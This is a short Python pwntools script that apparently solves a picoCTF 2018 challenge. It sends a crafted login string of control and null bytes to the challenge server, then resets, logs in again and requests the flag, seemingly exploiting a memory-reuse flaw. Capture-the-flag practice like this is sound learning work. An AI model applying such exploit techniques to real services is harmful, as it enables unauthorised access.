# coding=utf-8
from pwn import *

r = remote('2018shell.picoctf.com', 29508)
r.sendlineafter('Enter your command:', 'login {}'.format(chr(5) * 9 + chr(0) *3 + chr(5) * 100))
r.sendlineafter('Enter your command:', 'reset')
r.sendlineafter('Enter your command:', 'login a')
r.sendlineafter('Enter your command:', 'get-flag')
print r.recvall(1)

